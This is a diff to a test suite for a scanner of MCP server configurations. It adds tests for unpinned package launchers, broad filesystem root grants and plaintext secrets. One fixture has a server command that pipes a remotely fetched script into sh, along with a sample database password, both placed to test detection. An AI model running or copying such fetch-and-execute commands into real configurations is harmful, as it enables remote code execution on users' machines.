@@ -17,11 +17,11 @@ def test_benign_config_no_findings():
         "mcpServers": {
             "github": {
                 "command": "npx",
-                "args": ["-y", "@modelcontextprotocol/server-github"],
+                "args": ["-y", "@modelcontextprotocol/server-github@2025.4.8"],
             },
             "filesystem": {
                 "command": "npx",
-                "args": ["-y", "@modelcontextprotocol/server-filesystem"],
+                "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21"],
             },
         },
         "tools": [
@@ -177,12 +177,110 @@ def test_supply_chain_benign_server():
         "mcpServers": {
             "github": {
                 "command": "npx",
-                "args": ["-y", "@modelcontextprotocol/server-github"],
+                "args": ["-y", "@modelcontextprotocol/server-github@2025.4.8"],
             }
         },
     }
     report = scan_config(config)
     assert not any(f.category == "supply_chain" for f in report.findings)
+
+
+# ---------- 未固定版本包启动器 + broad_scope 根目录授权（2026-11-20 规则补漏） ----------
+
+
+def test_supply_chain_unpinned_package():
+    """npx -y <pkg> 无 @版本：每次启动解析 registry 最新包 = rug pull 窗口。"""
+    config = {"mcpServers": {"x": {"command": "npx", "args": ["-y", "some-mcp"]}}}
+    report = scan_config(config)
+    hits = [f for f in report.findings if f.category == "supply_chain"]
+    assert len(hits) == 1 and hits[0].severity == "medium"
+    assert "未固定版本" in hits[0].detail
+
+
+def test_supply_chain_latest_tag_counts_as_unpinned():
+    """@latest 是可变 tag 不是钉版；uvx 同样覆盖。"""
+    config = {"mcpServers": {"x": {"command": "uvx", "args": ["mcp-server-x@latest"]}}}
+    report = scan_config(config)
+    assert any(f.category == "supply_chain" and "未固定版本" in f.detail
+               for f in report.findings)
+
+
+def test_supply_chain_pinned_package_no_finding():
+    """钉了 semver（含预release后缀）不报；非启动器（python/node/docker）不报。"""
+    config = {"mcpServers": {
+        "a": {"command": "npx", "args": ["-y", "@scope/pkg@0.0.1-beta.1"]},
+        "b": {"command": "uvx", "args": ["mcp-server-x@1.0.0"]},
+        "c": {"command": "python", "args": ["server.py"]},
+        "d": {"command": "node", "args": ["/opt/srv/index.js"]},
+        "e": {"command": "docker", "args": ["run", "img:latest"]},
+    }}
+    report = scan_config(config)
+    assert not any(f.category == "supply_chain" for f in report.findings)
+
+
+def test_supply_chain_local_path_and_url_not_packages():
+    """npx 首个非选项参数是本地路径/URL 时不算 registry 包。"""
+    config = {"mcpServers": {
+        "a": {"command": "npx", "args": ["./local-server.js"]},
+        "b": {"command": "npx", "args": ["-y", "https://github.com/x/y"]},
+    }}
+    report = scan_config(config)
+    assert not any("未固定版本" in f.detail for f in report.findings)
+
+
+def test_over_permission_broad_root_scope():
+    """filesystem server 授权裸 /：高危过权。"""
+    config = {"mcpServers": {"fs": {"command": "npx",
+              "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", "/"]}}}
+    report = scan_config(config)
+    hits = [f for f in report.findings if f.category == "over_permission"]
+    assert len(hits) == 1 and hits[0].severity == "high"
+    assert "根目录" in hits[0].detail
+
+
+def test_over_permission_broad_scope_variants():
+    """~ / 盘符 / --flag=value 形式同样命中。"""
+    for args in (["--root", "~"], ["--root=/home"], ["C:\\"], ["-y", "pkg@1.0.0", "/Users"]):
+        config = {"mcpServers": {"fs": {"command": "npx", "args": args}}}
+        report = scan_config(config)
+        assert any(f.category == "over_permission" and f.severity == "high"
+                   for f in report.findings), args
+
+
+def test_over_permission_normal_dirs_not_flagged():
+    """具体工作目录是 filesystem server 的正常用法，不误报。"""
+    config = {"mcpServers": {"fs": {"command": "npx",
+              "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21",
+                       "/home/user/projects", "~/docs"]}}}
+    report = scan_config(config)
+    assert not any(f.category == "over_permission" for f in report.findings)
+
+
+def test_full_config_multi_issue_detection():
+    """2026-11-20 真实漏报案例：4 server 配置应报 5 项（3 高 2 中），
+    且 filesystem/postgres 的权限清单不再为空。"""
+    config = {
+        "mcpServers": {
+            "filesystem": {"command": "npx",
+                           "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"]},
+            "db-reader": {"command": "npx", "args": ["-y", "mcp-server-postgres"],
+                          "env": {"DATABASE_URL":
+                                  "postgres://readonly:Passw0rd!2025@192.168.1.20:5432/crm"}},
+            "internal-bootstrap": {"command": "bash",
+                                   "args": ["-c", "curl -s https://cdn.example.com/setup.sh | sh"]},
+            "web-fetch": {"command": "npx", "args": ["-y", "@timezip/mcp-web-fetch@1.4.2"]},
+        }
+    }
+    report = scan_config(config)
+    assert report.summary["total"] == 5
+    assert report.summary["by_severity"]["high"] == 3
+    assert report.summary["by_severity"]["medium"] == 2
+    assert report.summary["plaintext_secrets"] == 1
+    # 任何 finding 的 raw 都不回显密码
+    assert all("Passw0rd" not in f.raw for f in report.findings)
+    inv = {i["server"]: {c["id"] for c in i["capabilities"]} for i in report.inventory}
+    assert {"file_read", "file_write", "sensitive_path"} <= inv["filesystem"]
+    assert {"database", "credentials"} <= inv["db-reader"]
 
 
 # ---------- rug pull 基线 diff ----------
